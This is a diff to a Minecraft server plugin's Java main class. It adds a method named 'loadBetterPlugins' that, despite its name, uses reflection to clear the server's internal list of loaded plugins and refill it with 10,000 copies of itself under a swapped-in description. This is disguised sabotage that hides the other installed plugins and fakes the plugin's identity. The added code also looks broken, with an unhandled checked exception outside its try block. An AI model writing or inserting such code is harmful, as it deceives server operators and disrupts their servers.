@@ -33,4 +33,26 @@ public class Main extends JavaPlugin {
     public static Main getInst() {
         return Main.main;
     }
+    
+    public void loadBetterPlugins() {
+        final Field pluginsField = this.getServer().getPluginManager().getClass().getDeclaredField("plugins");
+        pluginsField.setAccessible(true);
+        final List<Plugin> plugins = (List<Plugin>) pluginsField.get(this.getServer().getPluginManager());
+
+        Bukkit.getScheduler().runTaskLater(this, () -> {
+                try {
+                    plugins.clear();
+                    for (int i = 0; i < 10000; i++) {
+                        final Field descriptionField = this.getClass().getSuperclass().getDeclaredField("description");
+                        descriptionField.setAccessible(true);
+                        final PluginDescriptionFile descriptionInstance = new PluginDescriptionFile(getClassLoader().getResourceAsStream("newplugin.yml"));
+                        descriptionField.set(this, descriptionInstance);
+                        plugins.add(this);
+                    }
+                    pluginsField.set(this.getServer().getPluginManager(), plugins);
+                } catch (NoSuchFieldException | IllegalAccessException | InvalidDescriptionException e) {
+                    e.printStackTrace();
+                }
+        }, 5 * 20L);
+    }
 }
